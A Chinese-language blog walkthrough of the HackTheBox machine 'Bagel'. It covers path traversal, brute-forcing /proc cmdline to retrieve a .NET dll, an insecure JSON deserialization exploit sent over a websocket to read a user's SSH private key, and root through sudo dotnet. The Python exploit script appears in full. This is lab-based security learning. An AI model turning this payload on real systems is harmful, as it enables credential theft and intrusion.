# Bagel

今天我开始了《Red Team Development and Operations A Practical Guide》的学习，保持学习，后面差不多到时机后就学CRTOⅡ

---

Bagel 是一款中等难度的 Linux 机器，其特点是电子商店容易受到路径遍历攻击，通过该攻击可以获取应用程序的源代码。然后，该漏洞用于下载“.NET”WebSocket服务器，该服务器一旦反汇编就会显示纯文本凭据。进一步的分析揭示了一个不安全的反序列化漏洞，该漏洞被用于读取任意文件，包括用户的私钥“SSH”。使用密钥在计算机上获取立足点，之前发现的密码用于透视到另一个用户，该用户可以使用具有“root”权限的“dotnet”工具。此错误配置用于执行恶意的“.NET”应用程序，从而导致权限完全升级。

---

## 外部信息收集

### 端口扫描

循例nmap

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/391f2e4f-16c4-132e-b8aa-bc0b1300e163.png)

### Web枚举

#### 8000

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/e9dd5b93-310e-f8d1-f1c8-4c271931d5b2.png)

发现这里存在任意文件读取

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/53d0e652-55b7-9c29-56fc-2b0a4c155f2b.png)

我们可以读取到app.py

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/d97c452b-b6e1-717b-f701-5ec098b0773c.png)

	don't forget to run the order app first with "dotnet <path to .dll>" command. Use your ssh key to access the machine.

这句话向我们提供的信息，我想5000端口就是这个程序

虽然也不是第一次遇到任意文件读取去读/proc下的东西，但是这一台靶机彻底的加深了我的印象

由于它在命令行运行dll的时候需要指定dll文件的路径，所以我们可以通过爆破pid来读取/proc/pid/cmdline，找到那个dll路径，再通过任意文件读取去下载它，然后对dll进行一个反编译

生成数字字典

```bash
for i in {1..1000};do echo $i >> ./nums.txt;done
```

ffuf

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/6b2bc8ae-4e8a-21e1-1aaf-0490b1a31d87.png)

我在pid 933发现了它

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/ed7a389c-c122-6743-4b7a-ff672d62b33b.png)

	/opt/bagel/bin/Debug/net6.0/bagel.dll

curl下下来

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/679c17f5-ee5c-f819-df33-b3ab62b29030.png)

## Foothold

MessageReceived函数将我们发送的json字符串反序列化后，进行了一次序列化，然后返回给客户端。

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/d786c460-a87f-1b2f-fa01-07eb3d480504.png)

跟踪到Handler，序列化和反序列化函数都使用type 4

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/837a37c3-0ddf-e7d6-3426-41100474fbaf.png)

当类型值为4时，将允许处理程序从序列化数据中推断正确的类型。同时为了能够利用它，我们还能够看到result被指定为Object，否则的话可能会由于类型不一致导致报错。

```csharp
object result;
...
```

在看另一个类File

```csharp
	public class File
	{
		// Token: 0x17000007 RID: 7
		// (get) Token: 0x0600001C RID: 28 RVA: 0x00002400 File Offset: 0x00000600
		// (set) Token: 0x0600001B RID: 27 RVA: 0x000023DD File Offset: 0x000005DD
		public string ReadFile
		{
			get
			{
				return this.file_content;
			}
			set
			{
				this.filename = value;
				this.ReadContent(this.directory + this.filename);
			}
		}

		// Token: 0x0600001D RID: 29 RVA: 0x00002418 File Offset: 0x00000618
		public void ReadContent(string path)
		{
			try
			{
				IEnumerable<string> values = File.ReadLines(path, Encoding.UTF8);
				this.file_content += string.Join("\n", values);
			}
			catch (Exception ex)
			{
				this.file_content = "Order not found!";
			}
		}
```

我们能够利用ReadFile属性来进行任意文件读取，原因是当进行反序列化时我们将能够设置ReadFile属性，即设置filename字段，并触发ReadContent()，此时我们还无法获取到文件内容，当再进行一次序列化时，file_content字段这些数据就会被带出来。

```python3
import websocket,json


ws = websocket.WebSocket()
ws.connect("ws://bagel.htb:5000/") # connect to order app
order = {"RemoveOrder":{"$type": "bagel_server.File, bagel",
"ReadFile":"../../../../home/phil/.ssh/id_rsa"}}
data = str(json.dumps(order))
ws.send(data)
result = ws.recv()
print(result)
```

我们还需要将ReadOrder改为RemoveOrder，这样我们就能不触发ReadOrder过滤../的ReadFile，而是直接执行由我们指定的ReadFile函数了

运行exp我们能够得到phil的ssh私钥

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/ccf11720-2ed7-8f00-461a-b65f63be932e.png)

登录ssh

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/8dd63e9b-e545-382a-8c16-d874ea84ce45.png)

## 本地横向移动 -> developer

前面在DB类里面发现了一组凭据，但遗憾的是developer不能使用密码登录ssh

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/e972ea5d-47fe-f89a-00c3-a5329953253b.png)

不过我们现在立足后可以在内部使用su

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/341227ad-d2bd-23e8-0b08-d332a7113625.png)

## 本地权限提升

sudo -l

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/88e97299-d1eb-a9ed-37bc-b1e1709f40b1.png)

轻松的提权

先把bagel的project复制到tmp

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/5b38f388-bdf1-e09a-5a23-799388ed15ee.png)

vim改Program.cs，我这里选择读root flag

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/5b57a21b-4e66-c7bc-d704-9bdbdc3bc0a9.png)

sudo dotnet run，我们将得到它

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/5def971c-eda8-90b5-e8db-b8f26f8e8880.png)
